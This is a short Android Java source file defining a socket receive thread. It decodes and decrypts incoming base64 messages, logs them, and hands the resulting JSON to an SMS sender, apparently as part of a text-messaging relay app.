package transport;

import org.json.JSONObject;

import android.util.Base64;
import android.util.Log;

import com.globex.textmessaging.SMS.SMSSender;

import crypto.CryptKeeper;

public class SockReceiveThread implements Runnable {
	private CryptKeeper ck = null;
	private SocketHandler sockHandler;

	public SockReceiveThread(){
		this.ck = CryptKeeper.getInstance();		
	}
	
	@Override
	public void run() {
		SMSSender sender = new SMSSender();

		try {
			this.sockHandler = SocketHandler.getInstance();

				byte[] data;
				byte[] decryptedData;
			while(true){
				byte[] b64data = this.sockHandler.receive();
				
				data = Base64.decode(new String(b64data), Base64.DEFAULT);
				decryptedData = ck.decrypt(data);
				Log.d("SockReceiveThread", "Received: " + new String(decryptedData));
				sender.sendMessage(new JSONObject(new String(decryptedData)));				
			}
		} catch (Exception e) {
			Log.d("Received Data", "Catched you..");
			e.printStackTrace();
		}
		
	}

}
